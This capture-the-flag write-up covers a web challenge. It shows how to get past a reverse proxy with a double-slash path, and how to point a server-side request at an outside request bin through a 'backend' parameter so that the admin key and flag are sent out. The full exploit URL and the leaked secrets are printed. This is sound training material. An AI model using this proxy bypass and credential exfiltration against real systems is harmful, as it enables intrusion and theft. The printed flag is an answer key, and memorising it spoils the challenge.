## Challenge Name: Flag Portal (Flag 1)
Author: zeyu2001  
Category: Web  
Points: 100  
Solves: 63  
<br>
>Welcome to the flag portal! Only admins can view the flag for now. Too bad you're behind a reverse proxy ¯\(ツ)/¯<br><br>
Note: There are two flags for this challenge.<br><br>
http://flagportal.chall.seetf.sg:10001

MD5: 0c4f55a57bd99f8438711c3734ccbf4f

[Download Zip File](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups/blob/main/web/Flag%20Portal%20(Flag%201)/files/web_flagportal.zip "Zip File")

### Approach
Opening up the source of the code, more specifically [remap.config](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups/blob/main/web/Flag%20Portal%20(Flag%201)/files/web_flagportal/distrib/proxy/remap.config), we see that there is a page at `http://flagportal.chall.seetf.sg:10001/admin`. However, this page is protected by the proxy that will redirect us to `http://flagportal/forbidden`. Luckily, we can easily bypass this by using `//admin` instead. This gives us a url of `http://flagportal.chall.seetf.sg:10001//admin`, which allows us to access the admin page.

Now that we can access the admin page, what do we do with it? Looking at the source code of the page in the [flagportal/server.rb](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups/blob/main/web/Flag%20Portal%20(Flag%201)/files/web_flagportal/distrib/flagportal/server.rb), we see the following code regarding the admin page.
```rb
elsif path == '/admin'
            params = req.params
            flagApi = params.fetch("backend", false) ? params.fetch("backend") : "http://backend/flag-plz"
            target = "https://bit.ly/3jzERNa"

            uri = URI(flagApi)
            req = Net::HTTP::Post.new(uri)
                req['Admin-Key'] = ENV.fetch("ADMIN_KEY")
                req['First-Flag'] = ENV.fetch("FIRST_FLAG")
                req.set_form_data('target' => target)

                res = Net::HTTP.start(uri.hostname, uri.port) {|http|
                http.request(req)
            }
```

Reading the code snippet, we realise a request with the first flag and admin key will be sent the the flagapi. We also see that the flagapi variable can be controlled by our url query paramters. It operates on the logic of setting it to `http://backend/flag-plz` unless we specify something else. 

Thus, we can set up a [requst bin](https://requestbin.com/) to recieve requests. To have the request sent to our request bin, we can set the url to be `http://flagportal.chall.seetf.sg:10001//admin?backend=enptarvw3f9y7.x.pipedream.net`. Note that the url you feed to the page should be a HTTP, not HTTPS, or it will error, giving you `400 Bad Request` and `The plain HTTP request was sent to HTTPS port`.

Now that the flag and admin key has been sent to the request bin, let's check them out!
![img](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups/blob/main/web/Flag%20Portal%20(Flag%201)/files/Request.png "Image")

This gives us the flag to be `SEE{n0w_g0_s0lv3_th3_n3xt_p4rt_bf38678e8a1749802b381aa0d36889e8}` and admin key to be `spendable-snoring-character-ditzy-sepia-lazily`. Hooray! Now we can move on to part 2 of the challenge. Check out our writeup for that [here](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups/blob/main/web/Flag%20Portal%20(Flag%202)/Flag%20Portal%20(Flag%202).md)!

### Flag
`SEE{n0w_g0_s0lv3_th3_n3xt_p4rt_bf38678e8a1749802b381aa0d36889e8}`

---
[Back to home](https://github.com/Team-Rainbow-Hash/seetf-2022-writeups)